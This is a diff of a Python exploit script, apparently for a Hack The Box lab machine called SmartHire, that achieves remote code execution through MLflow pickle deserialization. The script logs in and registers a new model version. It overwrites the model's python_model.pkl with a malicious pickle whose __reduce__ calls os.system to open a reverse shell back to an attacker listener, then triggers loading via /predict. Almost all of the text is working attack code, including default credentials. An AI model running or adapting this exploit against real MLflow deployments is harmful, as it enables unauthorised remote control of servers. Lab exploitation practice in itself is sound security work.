@@ -1,40 +1,63 @@
 #!/usr/bin/env python3
 """
-SmartHire - MLflow Pickle Deserialization RCE
-Usage: python3 exploit.py <LHOST> <LPORT>
+╔══════════════════════════════════════════════════════╗
+║       SmartHire - MLflow Pickle Deserialization RCE  ║
+║                                                      ║
+║       Author  : maverick-vf142                       ║
+║       HTB     : SmartHire                            ║
+║       CVE     : Pickle Deserialization via MLflow    ║
+╚══════════════════════════════════════════════════════╝
+
+Usage: python3 exploit.py <LHOST> <LPORT> [--target <URL>] [--mlflow <URL>]
+
+All credentials and targets are prompted or passed as args — nothing hardcoded.
 """
 
 import pickle
 import os
 import sys
-import time
+import argparse
+import getpass
 import requests
 
-if len(sys.argv) != 3:
-    print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
-    sys.exit(1)
+# ── Argument parsing ──────────────────────────────────────────────────────────
+parser = argparse.ArgumentParser(description="SmartHire MLflow RCE")
+parser.add_argument("lhost",   help="Your listener IP")
+parser.add_argument("lport",   help="Your listener port")
+parser.add_argument("--target", default="http://smarthire.htb",        help="Target app URL")
+parser.add_argument("--mlflow", default="http://models.smarthire.htb", help="MLflow URL")
+args = parser.parse_args()
 
-LHOST = sys.argv[1]
-LPORT = sys.argv[2]
-
-TARGET  = "http://smarthire.htb"
-MLFLOW  = "http://models.smarthire.htb"
-MLCREDS = ("admin", "password")
+LHOST  = args.lhost
+LPORT  = args.lport
+TARGET = args.target.rstrip("/")
+MLFLOW = args.mlflow.rstrip("/")
 
 TRAIN_CSV = b"name,skills,experience,education,position_applied,previous_company\nAlice,Python,48,Masters,Eng,Corp\nBob,Java,72,Bachelors,Dev,Inc\n"
 PRED_CSV  = b"name,skills,experience,education,position_applied,previous_company\nTest,Python,24,Bachelors,Eng,Co\n"
 
-# ── Pickle payload ────────────────────────────────────────────────────────────
-# os.system() is used (not exec/cloudpickle) because the server runs Python 3.10
-# while this script may run on 3.11+. cloudpickle embeds code objects that are
-# version-specific and will raise "code expected at most 16 arguments, got 18".
-# os.system is a C built-in — no code objects, works across all Python versions.
-#
-# The reverse shell is spawned via a fresh python3 call to avoid the same issue:
-# os.system() launches /bin/sh -c "python3 -c '...'" on the server, and that
-# python3 process (3.10) opens the socket. Bash /dev/tcp is avoided since the
-# Flask worker may run under a shell that doesn't support it.
+print("╔══════════════════════════════════════════════════════╗")
+print("║     SmartHire - MLflow Pickle Deserialization RCE    ║")
+print("║                  by maverick-vf142                   ║")
+print("╚══════════════════════════════════════════════════════╝")
+print(f"[*] Target  : {TARGET}")
+print(f"[*] MLflow  : {MLFLOW}")
+print(f"[*] Listener: {LHOST}:{LPORT}")
+print()
 
+# ── App credentials ───────────────────────────────────────────────────────────
+print("[*] App credentials (needs upload/admin role):")
+app_user = input("    Username : ")
+app_pass = getpass.getpass("    Password : ")
+
+# ── MLflow credentials ────────────────────────────────────────────────────────
+print("\n[*] MLflow credentials (press Enter to use defaults admin/password):")
+ml_user  = input("    MLflow username [admin]   : ").strip() or "admin"
+ml_pass  = getpass.getpass("    MLflow password [password]: ") or "password"
+MLCREDS  = (ml_user, ml_pass)
+print()
+
+# ── Pickle payload ────────────────────────────────────────────────────────────
 class ReverseShell:
     def __reduce__(self):
         cmd = (
@@ -50,53 +73,89 @@ class ReverseShell:
         return (os.system, (cmd,))
 
 payload = pickle.dumps(ReverseShell())
+print(f"[+] Pickle payload built ({len(payload)} bytes)")
 
 # ── Login ─────────────────────────────────────────────────────────────────────
-print("[*] Logging in...")
+print(f"[*] Logging in as '{app_user}'...")
 sess = requests.Session()
-r = sess.post(f"{TARGET}/login", data={"username": "ben", "password": "12345678"})
-if "dashboard" not in r.url and r.status_code not in (200, 302):
-    print("[!] Login failed"); sys.exit(1)
-print("[+] Logged in as Admin")
+r = sess.post(f"{TARGET}/login",
+              data={"username": app_user, "password": app_pass},
+              allow_redirects=True)
 
-# ── Train a fresh model (creates a new uncached MLflow run) ───────────────────
-# MLflow caches downloaded models locally. Overwriting an artifact that was
-# already loaded has no effect — the server uses its cached copy.
-# Uploading a new CSV registers a brand-new model version under a new run_id.
-# We overwrite THAT run's pickle before /predict ever loads it, so there is
-# no cache entry yet and our malicious file is fetched fresh.
-print("[*] Uploading training CSV to register a new model version...")
+if "dashboard" not in r.url:
+    print(f"[!] Login failed — landed at: {r.url}")
+    print(f"    HTTP {r.status_code} | Check credentials or --target")
+    sys.exit(1)
+print(f"[+] Login OK — session active")
+
+# ── Upload training CSV ───────────────────────────────────────────────────────
+print("[*] Uploading training CSV to register a new MLflow model version...")
 r = sess.post(f"{TARGET}/upload_hiring_data",
               files={"file": ("train.csv", TRAIN_CSV, "text/csv")})
-version = r.json().get("model_info", {}).get("version", "?")
-print(f"[+] Registered model version {version}")
 
-# ── Grab the run_id MLflow just created ───────────────────────────────────────
-print("[*] Fetching new run_id from MLflow API...")
+if "login" in r.url:
+    print("[!] Redirected to login — this account lacks upload/admin permissions")
+    sys.exit(1)
+
+if r.status_code != 200:
+    print(f"[!] Upload failed: HTTP {r.status_code} | {r.text[:300]}")
+    sys.exit(1)
+
+try:
+    version = r.json().get("model_info", {}).get("version", "?")
+except requests.exceptions.JSONDecodeError:
+    print(f"[!] Non-JSON response from /upload_hiring_data:")
+    print(f"    {r.text[:400]}")
+    sys.exit(1)
+
+print(f"[+] Registered model version: {version}")
+
+# ── Grab latest run_id from MLflow ────────────────────────────────────────────
+print("[*] Fetching latest run_id from MLflow API...")
 r = requests.post(
     f"{MLFLOW}/api/2.0/mlflow/runs/search",
     json={"experiment_ids": ["0"], "max_results": 1},
     auth=MLCREDS
 )
-run_id = r.json()["runs"][0]["info"]["run_id"]
+
+if r.status_code == 401:
+    print("[!] MLflow auth failed — wrong MLflow credentials")
+    sys.exit(1)
+
+try:
+    run_id = r.json()["runs"][0]["info"]["run_id"]
+except (KeyError, IndexError):
+    print(f"[!] Could not parse run_id:\n    {r.text[:300]}")
+    sys.exit(1)
+
 print(f"[+] run_id: {run_id}")
 
-# ── Overwrite python_model.pkl with malicious pickle ──────────────────────────
+# ── Overwrite python_model.pkl ────────────────────────────────────────────────
 print("[*] Replacing python_model.pkl with malicious pickle...")
-url = f"{MLFLOW}/api/2.0/mlflow-artifacts/artifacts/0/{run_id}/artifacts/model/python_model.pkl"
-r = requests.put(url, data=payload, auth=MLCREDS,
+artifact_url = (
+    f"{MLFLOW}/api/2.0/mlflow-artifacts/artifacts"
+    f"/0/{run_id}/artifacts/model/python_model.pkl"
+)
+r = requests.put(artifact_url, data=payload, auth=MLCREDS,
                  headers={"Content-Type": "application/octet-stream"})
-if r.status_code != 200:
-    print(f"[!] Upload failed: {r.status_code} {r.text}"); sys.exit(1)
-print(f"[+] Malicious pickle uploaded ({len(payload)} bytes)")
 
-# ── Trigger prediction → model is loaded → pickle executes ───────────────────
-print(f"[*] Triggering /predict — watch your listener on {LHOST}:{LPORT} ...")
+if r.status_code != 200:
+    print(f"[!] Artifact upload failed: HTTP {r.status_code} | {r.text[:300]}")
+    sys.exit(1)
+
+print(f"[+] Malicious pickle uploaded successfully")
+
+# ── Trigger /predict → executes pickle → reverse shell ───────────────────────
+print(f"\n[!] Start your listener now:  nc -lvnp {LPORT}")
+input("[*] Press Enter when your listener is ready...")
+
+print(f"[*] Triggering /predict ...")
 try:
     sess.post(f"{TARGET}/predict",
               files={"file": ("pred.csv", PRED_CSV, "text/csv")},
               timeout=20)
 except requests.exceptions.Timeout:
-    pass  # expected — the shell holds the connection open
+    pass  # expected — shell holds the connection open
 
-print("[+] Request sent. If the shell didn't arrive, the server may block outbound TCP.")
+print("[+] Done — check your listener for a shell.")
+print("    If nothing arrived, the box may block outbound TCP.")
